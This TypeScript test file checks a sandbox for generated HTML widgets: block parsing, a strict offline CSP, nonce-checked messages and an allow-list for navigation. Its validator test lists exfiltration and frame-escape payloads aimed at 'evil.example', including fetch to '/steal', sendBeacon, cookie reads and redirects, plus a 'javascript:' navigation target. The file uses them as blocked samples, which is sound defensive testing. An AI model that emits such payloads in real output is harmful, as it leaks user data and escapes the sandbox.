import { test } from "node:test";
import assert from "node:assert/strict";
import {
  buildGenUiSrcDoc,
  clampHeight,
  extractGenUiBlocks,
  GEN_UI_CSP,
  MAX_GEN_UI_BYTES,
  MAX_GEN_UI_HEIGHT,
  MIN_GEN_UI_HEIGHT,
  parseGenUiMessage,
  validateGenUiHtml,
} from "../src/lib/gen-ui-pure.ts";

test("extractGenUiBlocks separates prose from orbit-ui/gen-ui blocks and preserves regular code fences", () => {
  const md = [
    "Here is a simulator:",
    '```orbit-ui {"title":"Crate Economy","kind":"simulator","height":420}',
    "<div class='card'>Slider</div>",
    "```",
    "And normal TypeScript:",
    "```ts",
    "const x = 1;",
    "```",
    '```gen-ui kind=chart title="Revenue"',
    "<svg></svg>",
    "```",
  ].join("\n");

  const segs = extractGenUiBlocks(md);
  assert.equal(segs.length, 4);
  assert.equal(segs[0].type, "markdown");
  assert.equal(segs[1].type, "gen-ui");
  if (segs[1].type === "gen-ui") {
    assert.equal(segs[1].block.title, "Crate Economy");
    assert.equal(segs[1].block.kind, "simulator");
    assert.equal(segs[1].block.height, 420);
    assert.equal(segs[1].block.streaming, false);
    assert.equal(segs[1].block.html, "<div class='card'>Slider</div>");
  }
  assert.equal(segs[2].type, "markdown");
  if (segs[2].type === "markdown") assert.match(segs[2].text, /const x = 1;/);
  assert.equal(segs[3].type, "gen-ui");
  if (segs[3].type === "gen-ui") {
    assert.equal(segs[3].block.title, "Revenue");
    assert.equal(segs[3].block.kind, "chart");
  }
});

test("extractGenUiBlocks marks an unclosed fence at end of reply as streaming", () => {
  const md = 'Intro\n```orbit-ui {"title":"Live"}\n<div>partial';
  const segs = extractGenUiBlocks(md);
  assert.equal(segs.length, 2);
  assert.equal(segs[1].type, "gen-ui");
  if (segs[1].type === "gen-ui") {
    assert.equal(segs[1].block.streaming, true);
    assert.equal(segs[1].block.title, "Live");
  }
});

test("validateGenUiHtml allows offline interactive widgets and blocks network egress or frame escape", () => {
  assert.deepEqual(
    validateGenUiHtml('<div class="card"><input type="range" oninput="out.textContent=this.value"><span id="out">5</span></div>'),
    { ok: true },
  );

  assert.equal(validateGenUiHtml("   ").ok, false);
  assert.equal(validateGenUiHtml("x".repeat(MAX_GEN_UI_BYTES + 1)).ok, false);

  const blocked = [
    '<script src="https://evil.example/x.js"></script>',
    '<link rel="stylesheet" href="https://evil.example/a.css">',
    "<script>fetch('https://evil.example/steal')</script>",
    "<script>new WebSocket('wss://evil.example')</script>",
    "<script>navigator.sendBeacon('https://evil.example', 'x')</script>",
    '<form action="https://evil.example/post"></form>',
    "<iframe src='https://evil.example'></iframe>",
    "<script>window.top.location = 'https://evil.example'</script>",
    "<script>console.log(document.cookie)</script>",
    '<meta http-equiv="refresh" content="0;url=https://evil.example">',
  ];
  for (const html of blocked) {
    const res = validateGenUiHtml(html);
    assert.equal(res.ok, false, `Expected blocked: ${html}`);
  }
});

test("buildGenUiSrcDoc injects strict offline CSP, theme tokens, and sanitized nonce", () => {
  const doc = buildGenUiSrcDoc("<div>Hello</div>", "nonce_123");
  assert.ok(doc.includes(GEN_UI_CSP));
  assert.ok(doc.includes("connect-src 'none'"));
  assert.ok(doc.includes('"nonce_123"'));
  assert.ok(doc.includes("window.orbitUi"));
  assert.ok(doc.includes("<div>Hello</div>"));
});

test("parseGenUiMessage enforces nonce, clamps heights, allow-lists planets, and rejects forged messages", () => {
  assert.equal(parseGenUiMessage({ __orbitUi: "wrong", type: "resize", height: 300 }, "abc"), null);
  assert.equal(parseGenUiMessage(null, "abc"), null);

  assert.deepEqual(parseGenUiMessage({ __orbitUi: "abc", type: "resize", height: 50 }, "abc"), {
    type: "resize",
    height: MIN_GEN_UI_HEIGHT,
  });
  assert.deepEqual(parseGenUiMessage({ __orbitUi: "abc", type: "resize", height: 9999 }, "abc"), {
    type: "resize",
    height: MAX_GEN_UI_HEIGHT,
  });
  assert.equal(clampHeight(Number.NaN), 340);

  assert.deepEqual(parseGenUiMessage({ __orbitUi: "abc", type: "navigate", target: "studio" }, "abc"), {
    type: "navigate",
    target: "STUDIO",
  });
  assert.equal(parseGenUiMessage({ __orbitUi: "abc", type: "navigate", target: "javascript:alert(1)" }, "abc"), null);
  assert.deepEqual(parseGenUiMessage({ __orbitUi: "abc", type: "ask", prompt: "  simulate 20% off  " }, "abc"), {
    type: "ask",
    prompt: "simulate 20% off",
  });
});
